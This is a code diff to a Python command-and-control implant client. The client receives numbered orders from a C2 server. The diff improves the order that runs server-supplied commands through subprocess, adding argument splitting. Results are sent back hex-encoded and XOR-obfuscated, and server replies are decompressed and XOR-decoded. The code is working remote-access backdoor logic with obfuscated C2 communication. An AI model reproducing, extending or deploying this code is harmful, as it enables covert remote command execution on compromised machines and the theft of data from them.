@@ -55,7 +55,13 @@ def execute_order(order, additional_data_received = ""):
 
   elif order == str(5):
     try:
-      result_command = subprocess.check_output(additional_data_received) # pour implémenter les arguments : https://stackoverflow.com/questions/12288830/subprocess-check-output-not-accepting-long-arguments
+      additional_data_received = additional_data_received
+      list_arguments = additional_data_received.split("-")
+      list_arguments_2 = [list_arguments[0].strip()]
+      for _ in list_arguments[1:]:
+        list_arguments_2.append(f"-{_.strip()}")
+
+      result_command = subprocess.check_output(list_arguments_2)
       print("Result command : ", result_command)
     except Exception as e:
       print("Error while executing the command of the C2 server : ", e)
@@ -71,7 +77,7 @@ def send_receive_request(url, order_received = None, additional_data_received = 
   global main_url
 
   session_id = ''.join(random.choice(string.ascii_lowercase)[:10] for _ in range(10))
-  
+
   if order_received is None:
     step_list = []
   else:
@@ -80,7 +86,7 @@ def send_receive_request(url, order_received = None, additional_data_received = 
     print("The program send this data : ", string_to_send)
 
     answer_program_string = binascii.hexlify(string_to_send.encode("ISO-8859-1")).decode("ISO-8859-1")
-    xor_byte = ord(session_id[0]) 
+    xor_byte = ord(session_id[0])
     answer_message_xor = "".join([chr(ord(cs) ^ xor_byte) for cs in answer_program_string])
 
     list_message_to_c2 = []
@@ -132,7 +138,8 @@ def send_receive_request(url, order_received = None, additional_data_received = 
 
   message_hex = binascii.unhexlify(regex_string.encode("ISO-8859-1"))
 
-  decompressed_message = zlib.decompress(message_hex).decode("ISO-8859-1")
+  zobj = zlib.decompressobj()
+  decompressed_message = zobj.decompress(message_hex).decode("ISO-8859-1")
 
   message_plain_text = "".join([chr(ord(cs) ^ byte_message) for cs in decompressed_message])
 
@@ -184,7 +191,7 @@ def main():
   #   pass
 
 
-  
+
 
 
   # ##Finding CNAME Value
